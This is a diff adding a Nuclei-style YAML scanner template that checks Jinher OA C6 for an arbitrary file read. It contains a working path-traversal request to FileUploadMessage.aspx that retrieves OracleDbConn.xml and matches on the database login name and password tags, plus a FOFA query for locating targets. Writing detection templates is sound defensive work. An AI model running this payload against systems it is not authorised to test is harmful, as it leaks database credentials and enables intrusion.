@@ -1,0 +1,29 @@
+id: jinher-oa-c6-fileuploadmessage-fileread
+
+info:
+  name: 金和 OA C6 FileUploadMessage 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    金和 OA C6 FileUploadMessage.aspx 的 filename 参数可穿越读取 OracleDbConn.xml，泄露数据库账号口令。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="金和网络-金和OA"
+  tags: jinher,c6,lfi,disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<DbLoginName>"
+          - "<DbLoginPass>"
+        condition: and
+      - type: status
+        status:
+          - 200
